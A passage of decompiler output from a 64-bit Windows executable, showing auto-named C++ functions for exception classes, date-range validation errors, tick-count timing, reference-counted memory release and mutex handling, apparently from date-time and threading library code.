  const struct std::exception *v2; // rdi
  std::exception *v3; // rbx
  __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A4E20;
  if ( v2 )
    v2 = (const struct std::exception *)((char *)v2 + 24);
  *((_QWORD *)v3 + 3) = &off_1400A3CB0;
  v4 = *((_QWORD *)v2 + 1);
  *((_QWORD *)v3 + 4) = v4;
  if ( v4 )
    (*(void (__cdecl **)(__int64))(*(_QWORD *)v4 + 24i64))(v4);
  *((_QWORD *)v3 + 5) = *((_QWORD *)v2 + 2);
  *((_QWORD *)v3 + 6) = *((_QWORD *)v2 + 3);
  *((_DWORD *)v3 + 14) = *((_DWORD *)v2 + 8);
  *(_QWORD *)v3 = &off_1400A4F40;
  *((_QWORD *)v3 + 3) = &off_1400A4F50;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A4E20: using guessed type __int64 (__fastcall *off_1400A4E20)(void *);
// 1400A4F40: using guessed type __int64 (__fastcall *off_1400A4F40)(void *);
// 1400A4F50: using guessed type __int64 (__fastcall *off_1400A4F50)();

//----- (0000000140018040) ----------------------------------------------------
std::exception *__fastcall sub_140018040(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rdi
  std::exception *v3; // rbx
  __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A4E20;
  if ( v2 )
    v2 = (const struct std::exception *)((char *)v2 + 24);
  *((_QWORD *)v3 + 3) = &off_1400A3CB0;
  v4 = *((_QWORD *)v2 + 1);
  *((_QWORD *)v3 + 4) = v4;
  if ( v4 )
    (*(void (__cdecl **)(__int64))(*(_QWORD *)v4 + 24i64))(v4);
  *((_QWORD *)v3 + 5) = *((_QWORD *)v2 + 2);
  *((_QWORD *)v3 + 6) = *((_QWORD *)v2 + 3);
  *((_DWORD *)v3 + 14) = *((_DWORD *)v2 + 8);
  *(_QWORD *)v3 = &off_1400A4F40;
  *((_QWORD *)v3 + 3) = &off_1400A4F50;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A4E20: using guessed type __int64 (__fastcall *off_1400A4E20)(void *);
// 1400A4F40: using guessed type __int64 (__fastcall *off_1400A4F40)(void *);
// 1400A4F50: using guessed type __int64 (__fastcall *off_1400A4F50)();

//----- (00000001400180D0) ----------------------------------------------------
std::exception *__fastcall sub_1400180D0(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rdi
  std::exception *v3; // rbx
  __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A4E20;
  if ( v2 )
    v2 = (const struct std::exception *)((char *)v2 + 24);
  *((_QWORD *)v3 + 3) = &off_1400A3CB0;
  v4 = *((_QWORD *)v2 + 1);
  *((_QWORD *)v3 + 4) = v4;
  if ( v4 )
    (*(void (__cdecl **)(__int64))(*(_QWORD *)v4 + 24i64))(v4);
  *((_QWORD *)v3 + 5) = *((_QWORD *)v2 + 2);
  *((_QWORD *)v3 + 6) = *((_QWORD *)v2 + 3);
  *((_DWORD *)v3 + 14) = *((_DWORD *)v2 + 8);
  *(_QWORD *)v3 = &off_1400A4F40;
  *((_QWORD *)v3 + 3) = &off_1400A4F50;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A4E20: using guessed type __int64 (__fastcall *off_1400A4E20)(void *);
// 1400A4F40: using guessed type __int64 (__fastcall *off_1400A4F40)(void *);
// 1400A4F50: using guessed type __int64 (__fastcall *off_1400A4F50)();

//----- (0000000140018310) ----------------------------------------------------
std::exception *__fastcall sub_140018310(std::exception *a1, const struct std::exception *a2)
{
  std::exception *v2; // rbx

  v2 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v2 = &off_1400A4E20;
  return v2;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A4E20: using guessed type __int64 (__fastcall *off_1400A4E20)(void *);

//----- (0000000140018340) ----------------------------------------------------
std::exception *__fastcall sub_140018340(std::exception *a1)
{
  std::exception *v1; // rbx
  void *v2; // rax
  void *v4; // [rsp+20h] [rbp-48h]
  __int64 v5; // [rsp+28h] [rbp-40h]
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v7; // [rsp+40h] [rbp-28h]
  unsigned __int64 v8; // [rsp+48h] [rbp-20h]

  v5 = -2i64;
  v1 = a1;
  v8 = 15i64;
  v7 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, "Day of month value is out of range 1..31", 0x28ui64);
  v2 = &Dst;
  if ( v8 >= 0x10 )
    v2 = Dst;
  v4 = v2;
  std::exception::exception(v1, (const char *const *)&v4);
  *(_QWORD *)v1 = &off_1400A4E20;
  if ( v8 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A4E20;
  return v1;
}
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);
// 1400A4E20: using guessed type __int64 (__fastcall *off_1400A4E20)(void *);

//----- (00000001400183F0) ----------------------------------------------------
std::exception *__fastcall sub_1400183F0(std::exception *a1)
{
  std::exception *v1; // rbx
  void *v2; // rax
  void *v4; // [rsp+20h] [rbp-48h]
  __int64 v5; // [rsp+28h] [rbp-40h]
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v7; // [rsp+40h] [rbp-28h]
  unsigned __int64 v8; // [rsp+48h] [rbp-20h]

  v5 = -2i64;
  v1 = a1;
  v8 = 15i64;
  v7 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, "Month number is out of range 1..12", 0x22ui64);
  v2 = &Dst;
  if ( v8 >= 0x10 )
    v2 = Dst;
  v4 = v2;
  std::exception::exception(v1, (const char *const *)&v4);
  *(_QWORD *)v1 = &off_1400A4E20;
  if ( v8 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A4E20;
  return v1;
}
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);
// 1400A4E20: using guessed type __int64 (__fastcall *off_1400A4E20)(void *);

//----- (00000001400184A0) ----------------------------------------------------
std::exception *__fastcall sub_1400184A0(std::exception *a1)
{
  std::exception *v1; // rbx
  void *v2; // rax
  void *v4; // [rsp+20h] [rbp-48h]
  __int64 v5; // [rsp+28h] [rbp-40h]
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v7; // [rsp+40h] [rbp-28h]
  unsigned __int64 v8; // [rsp+48h] [rbp-20h]

  v5 = -2i64;
  v1 = a1;
  v8 = 15i64;
  v7 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, "Year is out of valid range: 1400..10000", 0x27ui64);
  v2 = &Dst;
  if ( v8 >= 0x10 )
    v2 = Dst;
  v4 = v2;
  std::exception::exception(v1, (const char *const *)&v4);
  *(_QWORD *)v1 = &off_1400A4E20;
  if ( v8 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A4E20;
  return v1;
}
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);
// 1400A4E20: using guessed type __int64 (__fastcall *off_1400A4E20)(void *);

//----- (0000000140018630) ----------------------------------------------------
_DWORD *__fastcall sub_140018630(_DWORD *a1, int a2)
{
  _DWORD *v2; // rbx
  signed __int64 v3; // r8
  signed __int64 v4; // rdx
  signed __int64 v5; // r9
  char v7; // [rsp+48h] [rbp+10h]

  v2 = a1;
  v3 = 1i64;
  if ( a2 )
  {
    switch ( a2 )
    {
      case 1:
        *a1 = 0;
        return v2;
      case 2:
        *a1 = -1;
        return v2;
      case 3:
        *a1 = 1;
LABEL_11:
        v4 = 1400i64;
        v5 = 1i64;
LABEL_14:
        *a1 = *(_DWORD *)sub_140018550(&v7, v4, v3, v5, -2i64);
        return v2;
      case 4:
        *a1 = -3;
LABEL_13:
        v4 = 9999i64;
        v5 = 31i64;
        v3 = 12i64;
        goto LABEL_14;
    }
  }
  *a1 = -2;
  if ( a2 == 3 )
    goto LABEL_11;
  if ( a2 == 4 )
    goto LABEL_13;
  return v2;
}
// 140018550: using guessed type __int64 __fastcall sub_140018550(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);

//----- (00000001400186C0) ----------------------------------------------------
__int64 __fastcall sub_1400186C0(__int64 a1)
{
  __int64 v1; // rdi
  __int64 v2; // rax

  v1 = a1;
  *(_QWORD *)a1 = &off_1400A4EF8;
  *(_DWORD *)(a1 + 8) = 0;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)(a1 + 24) = 0i64;
  *(_DWORD *)(a1 + 32) = 0;
  *(_QWORD *)(a1 + 40) = 0i64;
  *(_QWORD *)(a1 + 48) = 0i64;
  sub_14001BD60();
  *(_QWORD *)(v1 + 40) = v2;
  *(_QWORD *)(v1 + 56) = 0i64;
  *(_QWORD *)(v1 + 64) = 0i64;
  *(_QWORD *)(v1 + 72) = 0i64;
  *(_QWORD *)(v1 + 80) = 0i64;
  *(_QWORD *)(v1 + 88) = 0i64;
  *(_QWORD *)(v1 + 96) = 0i64;
  *(_QWORD *)(v1 + 104) = sub_140013410(1, 0);
  *(_BYTE *)(v1 + 112) = 1;
  return v1;
}
// 1400A4EF8: using guessed type __int64 (__fastcall *off_1400A4EF8)(void *);

//----- (0000000140018750) ----------------------------------------------------
_QWORD *__fastcall sub_140018750(_QWORD *a1, int a2)
{
  int v2; // edx
  int v3; // edx
  int v4; // edx

  if ( a2 )
  {
    v2 = a2 - 1;
    if ( !v2 )
    {
      *a1 = 0x8000000000000000i64;
      return a1;
    }
    v3 = v2 - 1;
    if ( !v3 )
    {
      *a1 = 0x7FFFFFFFFFFFFFFFi64;
      return a1;
    }
    v4 = v3 - 1;
    if ( !v4 )
    {
      *a1 = -9223372036854775807i64;
      return a1;
    }
    if ( v4 == 1 )
    {
      *a1 = 9223372036854775805i64;
      return a1;
    }
  }
  *a1 = 9223372036854775806i64;
  return a1;
}

//----- (00000001400187C0) ----------------------------------------------------
__int64 __fastcall sub_1400187C0(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rbx
  signed __int64 (*v4)(); // rcx
  HMODULE v5; // rax
  FARPROC v6; // rax

  v2 = a2;
  v3 = a1;
  v4 = (signed __int64 (*)())qword_1400D9E50;
  if ( !qword_1400D9E50 )
  {
    v5 = GetModuleHandleA("KERNEL32.DLL");
    v6 = GetProcAddress(v5, "GetTickCount64");
    v4 = sub_14001A620;
    if ( v6 )
      v4 = v6;
    qword_1400D9E50 = (__int64)v4;
  }
  *(_QWORD *)v3 = ((__int64 (__cdecl *)(signed __int64 (*)()))v4)(v4);
  *(_QWORD *)(v3 + 8) = v2;
  *(_BYTE *)(v3 + 16) = 1;
  *(_QWORD *)(v3 + 24) = 9223372036854775806i64;
  return v3;
}
// 1400D9E50: using guessed type __int64 qword_1400D9E50;

//----- (0000000140018850) ----------------------------------------------------
__int64 __fastcall sub_140018850(std::exception *a1)
{
  std::exception *v1; // rbx
  __int64 v2; // rdx
  __int64 v3; // rcx

  v1 = a1;
  *(_QWORD *)a1 = &off_1400A4F58;
  *((_QWORD *)a1 + 3) = off_1400A4F68;
  *(_QWORD *)((char *)a1 + *(signed int *)(*((_QWORD *)a1 + 8) + 4i64) + 64) = &off_1400A4F70;
  v2 = *(signed int *)(*((_QWORD *)a1 + 8) + 4i64);
  *(_DWORD *)((char *)a1 + v2 + 60) = v2 - 16;
  *(_QWORD *)a1 = &off_1400A4F40;
  *((_QWORD *)a1 + 3) = &off_1400A3CB0;
  v3 = *((_QWORD *)a1 + 4);
  if ( v3 && (*(unsigned __int8 (**)(void))(*(_QWORD *)v3 + 32i64))() )
    *((_QWORD *)v1 + 4) = 0i64;
  return std::exception::~exception(v1);
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A4F40: using guessed type __int64 (__fastcall *off_1400A4F40)(void *);
// 1400A4F58: using guessed type __int64 (__fastcall *off_1400A4F58)(void *);
// 1400A4F68: using guessed type __int64 (__fastcall *off_1400A4F68[2])();
// 1400A4F70: using guessed type __int64 (__fastcall *off_1400A4F70)();

//----- (00000001400188E0) ----------------------------------------------------
__int64 __fastcall sub_1400188E0(std::exception *a1)
{
  std::exception *v1; // rbx
  __int64 v2; // rdx
  __int64 v3; // rcx

  v1 = a1;
  *(_QWORD *)a1 = &off_1400A5058;
  *((_QWORD *)a1 + 3) = off_1400A5068;
  *(_QWORD *)((char *)a1 + *(signed int *)(*((_QWORD *)a1 + 8) + 4i64) + 64) = &off_1400A5070;
  v2 = *(signed int *)(*((_QWORD *)a1 + 8) + 4i64);
  *(_DWORD *)((char *)a1 + v2 + 60) = v2 - 16;
  *(_QWORD *)a1 = &off_1400A4F40;
  *((_QWORD *)a1 + 3) = &off_1400A3CB0;
  v3 = *((_QWORD *)a1 + 4);
  if ( v3 && (*(unsigned __int8 (**)(void))(*(_QWORD *)v3 + 32i64))() )
    *((_QWORD *)v1 + 4) = 0i64;
  return std::exception::~exception(v1);
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A4F40: using guessed type __int64 (__fastcall *off_1400A4F40)(void *);
// 1400A5058: using guessed type __int64 (__fastcall *off_1400A5058)(void *);
// 1400A5068: using guessed type __int64 (__fastcall *off_1400A5068[2])();
// 1400A5070: using guessed type __int64 (__fastcall *off_1400A5070)();

//----- (0000000140018970) ----------------------------------------------------
__int64 __fastcall sub_140018970(std::exception *a1)
{
  std::exception *v1; // rbx
  __int64 v2; // rdx
  __int64 v3; // rcx

  v1 = a1;
  *(_QWORD *)a1 = &off_1400A5020;
  *((_QWORD *)a1 + 3) = off_1400A5030;
  *(_QWORD *)((char *)a1 + *(signed int *)(*((_QWORD *)a1 + 8) + 4i64) + 64) = &off_1400A5038;
  v2 = *(signed int *)(*((_QWORD *)a1 + 8) + 4i64);
  *(_DWORD *)((char *)a1 + v2 + 60) = v2 - 16;
  *(_QWORD *)a1 = &off_1400A4F40;
  *((_QWORD *)a1 + 3) = &off_1400A3CB0;
  v3 = *((_QWORD *)a1 + 4);
  if ( v3 && (*(unsigned __int8 (**)(void))(*(_QWORD *)v3 + 32i64))() )
    *((_QWORD *)v1 + 4) = 0i64;
  return std::exception::~exception(v1);
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A4F40: using guessed type __int64 (__fastcall *off_1400A4F40)(void *);
// 1400A5020: using guessed type __int64 (__fastcall *off_1400A5020)(void *);
// 1400A5030: using guessed type __int64 (__fastcall *off_1400A5030[2])();
// 1400A5038: using guessed type __int64 (__fastcall *off_1400A5038)();

//----- (0000000140018A00) ----------------------------------------------------
__int64 __fastcall sub_140018A00(std::exception *a1)
{
  std::exception *v1; // rbx
  __int64 v2; // rdx
  __int64 v3; // rcx

  v1 = a1;
  *(_QWORD *)a1 = &off_1400A4FA8;
  *((_QWORD *)a1 + 3) = off_1400A4FB8;
  *(_QWORD *)((char *)a1 + *(signed int *)(*((_QWORD *)a1 + 8) + 4i64) + 64) = &off_1400A4FC0;
  v2 = *(signed int *)(*((_QWORD *)a1 + 8) + 4i64);
  *(_DWORD *)((char *)a1 + v2 + 60) = v2 - 16;
  *(_QWORD *)a1 = &off_1400A4F90;
  *((_QWORD *)a1 + 3) = &off_1400A3CB0;
  v3 = *((_QWORD *)a1 + 4);
  if ( v3 && (*(unsigned __int8 (**)(void))(*(_QWORD *)v3 + 32i64))() )
    *((_QWORD *)v1 + 4) = 0i64;
  *(_QWORD *)v1 = &loc_1400A3C88;
  return std::exception::~exception(v1);
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A4F90: using guessed type __int64 (__fastcall *off_1400A4F90)(void *);
// 1400A4FA8: using guessed type __int64 (__fastcall *off_1400A4FA8)(void *);
// 1400A4FB8: using guessed type __int64 (__fastcall *off_1400A4FB8[2])();
// 1400A4FC0: using guessed type __int64 (__fastcall *off_1400A4FC0)();

//----- (0000000140018A90) ----------------------------------------------------
__int64 __fastcall sub_140018A90(std::exception *a1)
{
  std::exception *v1; // rbx
  __int64 v2; // rcx

  v1 = a1;
  *(_QWORD *)a1 = &off_1400A4F40;
  *((_QWORD *)a1 + 3) = &off_1400A3CB0;
  v2 = *((_QWORD *)a1 + 4);
  if ( v2 && (*(unsigned __int8 (**)(void))(*(_QWORD *)v2 + 32i64))() )
    *((_QWORD *)v1 + 4) = 0i64;
  return std::exception::~exception(v1);
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A4F40: using guessed type __int64 (__fastcall *off_1400A4F40)(void *);

//----- (0000000140018AE0) ----------------------------------------------------
__int64 __fastcall sub_140018AE0(std::exception *a1)
{
  std::exception *v1; // rbx
  __int64 v2; // rcx

  v1 = a1;
  *(_QWORD *)a1 = &off_1400A4F90;
  *((_QWORD *)a1 + 3) = &off_1400A3CB0;
  v2 = *((_QWORD *)a1 + 4);
  if ( v2 && (*(unsigned __int8 (**)(void))(*(_QWORD *)v2 + 32i64))() )
    *((_QWORD *)v1 + 4) = 0i64;
  *(_QWORD *)v1 = &loc_1400A3C88;
  return std::exception::~exception(v1);
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A4F90: using guessed type __int64 (__fastcall *off_1400A4F90)(void *);

//----- (0000000140018B40) ----------------------------------------------------
void __fastcall sub_140018B40(volatile signed __int32 **a1)
{
  volatile signed __int32 *v1; // rbx
  HANDLE v2; // rax

  v1 = *a1;
  if ( *a1 )
  {
    if ( !_InterlockedDecrement(v1 + 2) )
    {
      (**(void (__fastcall ***)(volatile signed __int32 *, _QWORD))v1)(v1, 0i64);
      v2 = GetProcessHeap();
      HeapFree(v2, 0, (LPVOID)v1);
    }
  }
}

//----- (0000000140018B80) ----------------------------------------------------
void __fastcall sub_140018B80(_QWORD *a1)
{
  JUMPOUT(*a1, 0i64, sub_14001D190);
}

//----- (0000000140018B90) ----------------------------------------------------
signed int __fastcall sub_140018B90(volatile signed __int32 **a1)
{
  volatile signed __int32 *v1; // rcx
  signed int result; // eax
  HANDLE v3; // rax

  v1 = *a1;
  result = _InterlockedExchangeAdd(v1, 0x80000000);
  if ( !_bittest(&result, 0x1Eu) && result > (signed int)2147483648 && !_interlockedbittestandset(v1, 0x1Eu) )
  {
    v3 = sub_1400139E0((__int64)v1);
    result = SetEvent(v3);
  }
  return result;
}

//----- (0000000140018BD0) ----------------------------------------------------
void __fastcall sub_140018BD0(__int64 **a1)
{
  void **v1; // rbx
  char v2; // [rsp+30h] [rbp+8h]

  v1 = (void **)a1;
  sub_14000EB20(a1, (__int64 *)&v2, **a1, (__int64)*a1);
  operator delete(*v1);
}

//----- (0000000140018C10) ----------------------------------------------------
void __fastcall sub_140018C10(__int64 a1)
{
  int v1; // eax

  if ( *(_BYTE *)(a1 + 8) )
  {
    v1 = Mtx_unlock(*(_QWORD *)a1);
    if ( v1 )
      std::_Throw_C_error(v1);
  }
}
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);

//----- (0000000140018C40) ----------------------------------------------------
__int64 __fastcall sub_140018C40(__int64 **a1)
{
  __int64 **v1; // rbx
  __int64 result; // rax

  v1 = a1;
  if ( *a1 )
  {
    sub_14001BE70((__int64)a1, *a1, a1[1]);
    operator delete(*v1);
    result = 0i64;
    *v1 = 0i64;
    v1[1] = 0i64;
    v1[2] = 0i64;
  }
  return result;
}

//----- (0000000140018C80) ----------------------------------------------------
__int64 __fastcall sub_140018C80(volatile signed __int32 ***a1)
{
  volatile signed __int32 ***v1; // rbx
  __int64 result; // rax

  v1 = a1;
  if ( *a1 )
  {
    sub_14001BF00((__int64)a1, *a1, a1[1]);
    operator delete(*v1);
    result = 0i64;
    *v1 = 0i64;
    v1[1] = 0i64;
    v1[2] = 0i64;
  }
  return result;
}

//----- (0000000140018CC0) ----------------------------------------------------
void __fastcall sub_140018CC0(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1;
  if ( *(_QWORD *)(a1 + 88) >= 0x10ui64 )
    operator delete(*(void **)(a1 + 64));
  *(_QWORD *)(v1 + 88) = 15i64;
  *(_QWORD *)(v1 + 80) = 0i64;
  *(_BYTE *)(v1 + 64) = 0;
  if ( *(_QWORD *)(v1 + 56) >= 0x10ui64 )
    operator delete(*(void **)(v1 + 32));
  *(_QWORD *)(v1 + 56) = 15i64;
  *(_QWORD *)(v1 + 48) = 0i64;
  *(_BYTE *)(v1 + 32) = 0;
  if ( *(_QWORD *)(v1 + 24) >= 0x10ui64 )
    operator delete(*(void **)v1);
  *(_QWORD *)(v1 + 24) = 15i64;
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_BYTE *)v1 = 0;
}

//----- (0000000140018D40) ----------------------------------------------------
__int64 __fastcall sub_140018D40(__int64 a1)
{
  __int64 v1; // rdi
  volatile signed __int32 *v2; // rbx
  HANDLE v3; // rax
  __int64 v5; // [rsp+48h] [rbp+10h]

  v1 = a1;
  CloseHandle(*(HANDLE *)(a1 + 40));
  v5 = v1 + 32;
  sub_1400366B0((volatile signed __int32 **)(v1 + 32));
  v2 = *(volatile signed __int32 **)(v1 + 32);
  if ( v2 && !_InterlockedDecrement(v2 + 2) )
  {
    (**(void (__fastcall ***)(volatile signed __int32 *, _QWORD))v2)(v2, 0i64);
    v3 = GetProcessHeap();
    HeapFree(v3, 0, (LPVOID)v2);
  }
  sub_140079390((__int64 **)(v1 + 8), &v5, **(_QWORD **)(v1 + 8), *(_QWORD *)(v1 + 8));
  operator delete(*(void **)(v1 + 8));
  return _Mtx_destroy(v1);
}
// 1400A1628: using guessed type __int64 __fastcall _Mtx_destroy(_QWORD);

//----- (0000000140018E80) ----------------------------------------------------
void __fastcall sub_140018E80(__int64 a1)
{
  void **v1; // rdi
  volatile signed __int32 *v2; // rbx
  signed int v3; // eax
  HANDLE v4; // rax

  v1 = (void **)a1;
  v2 = *(volatile signed __int32 **)(a1 + 8);
  sub_14001D400(*(volatile signed __int32 **)(a1 + 8));
  _InterlockedDecrement((volatile signed __int32 *)*v1 + 4);
  v3 = _InterlockedExchangeAdd(v2, 0x80000000);
  if ( !_bittest(&v3, 0x1Eu) && v3 > (signed int)2147483648 && !_interlockedbittestandset(v2, 0x1Eu) )
  {
    v4 = sub_1400139E0((__int64)v2);
    SetEvent(v4);
  }
  if ( *v1 )
    sub_14001D190(*v1);
}

//----- (0000000140018F50) ----------------------------------------------------
int __fastcall sub_140018F50(volatile signed __int32 **a1)
{
  volatile signed __int32 **v1; // rbx
  int result; // eax
  volatile signed __int32 *v3; // rbx
  HANDLE v4; // rax

  v1 = a1;
  result = sub_1400366B0(a1);
  v3 = *v1;
  if ( v3 )
  {
    if ( !_InterlockedDecrement(v3 + 2) )
    {
      (**(void (__fastcall ***)(volatile signed __int32 *, _QWORD))v3)(v3, 0i64);
      v4 = GetProcessHeap();
      result = HeapFree(v4, 0, (LPVOID)v3);
    }
  }
  return result;
}

//----- (0000000140018FB0) ----------------------------------------------------
volatile signed __int32 **__fastcall sub_140018FB0(volatile signed __int32 **a1, volatile signed __int32 **a2)
{
  volatile signed __int32 *v2; // r8
  volatile signed __int32 **v3; // rdi
  volatile signed __int32 *v4; // rax
  HANDLE v5; // rax
  volatile signed __int32 *lpMem; // [rsp+30h] [rbp+8h]
  volatile signed __int32 *lpMema; // [rsp+30h] [rbp+8h]

  v2 = *a2;
  v3 = a1;
  lpMem = *a2;
  if ( *a2 )
  {
    _InterlockedIncrement(v2 + 2);
    v2 = lpMem;
  }
  v4 = *a1;
  *a1 = v2;
  lpMema = v4;
  if ( !v4 || _InterlockedDecrement(v4 + 2) )
    return a1;
  (**(void (__fastcall ***)(volatile signed __int32 *, _QWORD))v4)(v4, 0i64);
  v5 = GetProcessHeap();
  HeapFree(v5, 0, (LPVOID)lpMema);
  return v3;
}

//----- (0000000140019030) ----------------------------------------------------
__int64 *__fastcall sub_140019030(void *a1, _DWORD *a2)
{
  void *v2; // rdi
  __int64 *v3; // rax
  __int64 *v4; // rbx
  unsigned int *v6; // rax
  int v7; // [rsp+40h] [rbp+8h]
  _DWORD *v8; // [rsp+50h] [rbp+18h]

  v2 = a1;
  v3 = *(__int64 **)(*(_QWORD *)a1 + 8i64);
  v4 = *(__int64 **)a1;
  while ( !*((_BYTE *)v3 + 25) )
  {
    if ( *((_DWORD *)v3 + 8) >= *a2 )
    {
      v4 = v3;
      v3 = (__int64 *)*v3;
    }
    else
    {
      v3 = (__int64 *)v3[2];
    }
  }
  if ( v4 != *(__int64 **)a1 && *a2 >= *((_DWORD *)v4 + 8) )
    return v4 + 5;
  v8 = a2;
  v6 = (unsigned int *)sub_1400161A0(a1, (__int64)&unk_1400D9E44, &v8);
  sub_140016610(v2, &v7, v4, v6 + 8, (__int64)v6);
  return (__int64 *)(*(_QWORD *)&v7 + 40i64);
}

//----- (00000001400190D0) ----------------------------------------------------
void **__fastcall sub_1400190D0(std::exception *a1)
{
  std::exception *v1; // rbx
  void **result; // rax

  v1 = a1;
  sub_140018850(a1);
  result = &off_1400A3CB8;
  *((_QWORD *)v1 + 10) = &off_1400A3CB8;
  return result;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (00000001400190F0) ----------------------------------------------------
void **__fastcall sub_1400190F0(std::exception *a1)
{
  std::exception *v1; // rbx
  void **result; // rax

  v1 = a1;
  sub_1400188E0(a1);
  result = &off_1400A3CB8;
  *((_QWORD *)v1 + 10) = &off_1400A3CB8;
  return result;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (0000000140019110) ----------------------------------------------------
void **__fastcall sub_140019110(std::exception *a1)
{
  std::exception *v1; // rbx
  void **result; // rax

  v1 = a1;
  sub_140018970(a1);
  result = &off_1400A3CB8;
  *((_QWORD *)v1 + 10) = &off_1400A3CB8;
  return result;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (0000000140019130) ----------------------------------------------------
void **__fastcall sub_140019130(std::exception *a1)
{
  std::exception *v1; // rbx
  void **result; // rax

  v1 = a1;
  sub_140018A00(a1);
  result = &off_1400A3CB8;
  *((_QWORD *)v1 + 10) = &off_1400A3CB8;
  return result;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (0000000140019150) ----------------------------------------------------
void **__fastcall sub_140019150(_QWORD *a1)
{
  _QWORD *v1; // rbx
  __int64 v2; // rdx
  void **result; // rax

  v1 = a1;
  *a1 = &off_1400A4FE8;
  a1[9] = off_1400A4FF8;
  *(_QWORD *)((char *)a1 + *(signed int *)(a1[14] + 4i64) + 112) = &off_1400A5000;
  v2 = *(signed int *)(a1[14] + 4i64);
  *(_DWORD *)((char *)a1 + v2 + 108) = v2 - 16;
  sub_140011530(a1);
  result = &off_1400A3CB8;
  v1[16] = &off_1400A3CB8;
  return result;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A4FE8: using guessed type __int64 (__fastcall *off_1400A4FE8)(void *);
// 1400A4FF8: using guessed type __int64 (__fastcall *off_1400A4FF8[2])();
// 1400A5000: using guessed type __int64 (__fastcall *off_1400A5000)();

//----- (00000001400191AC) ----------------------------------------------------
_QWORD *__fastcall sub_1400191AC(__int64 a1, char a2)
{
  return sub_140019260((void *)(a1 - *(signed int *)(a1 - 4) - 80), a2);
}

//----- (00000001400191BC) ----------------------------------------------------
_QWORD *__fastcall sub_1400191BC(__int64 a1, char a2)
{
  return sub_140019260((void *)(a1 - 24), a2);
}

//----- (00000001400191C8) ----------------------------------------------------
_QWORD *__fastcall sub_1400191C8(__int64 a1, char a2)
{
  return sub_1400192A0((void *)(a1 - *(signed int *)(a1 - 4) - 80), a2);
}

//----- (00000001400191D8) ----------------------------------------------------
_QWORD *__fastcall sub_1400191D8(__int64 a1, char a2)
{
  return sub_1400192A0((void *)(a1 - 24), a2);
}

//----- (00000001400191E4) ----------------------------------------------------
_QWORD *__fastcall sub_1400191E4(__int64 a1, char a2)
{
  return sub_1400192E0((void *)(a1 - *(signed int *)(a1 - 4) - 80), a2);
}

//----- (00000001400191F4) ----------------------------------------------------
_QWORD *__fastcall sub_1400191F4(__int64 a1, char a2)
{
  return sub_1400192E0((void *)(a1 - 24), a2);
}

//----- (0000000140019200) ----------------------------------------------------
_QWORD *__fastcall sub_140019200(__int64 a1, char a2)
{
  return sub_140019320((void *)(a1 - *(signed int *)(a1 - 4) - 80), a2);
}

//----- (0000000140019210) ----------------------------------------------------
_QWORD *__fastcall sub_140019210(__int64 a1, char a2)
{
  return sub_140019320((void *)(a1 - 24), a2);
}

//----- (000000014001921C) ----------------------------------------------------
_QWORD *__fastcall sub_14001921C(__int64 a1, char a2)
{
  return sub_140019360((void *)(a1 - *(signed int *)(a1 - 4) - 128), a2);
}

//----- (0000000140019230) ----------------------------------------------------
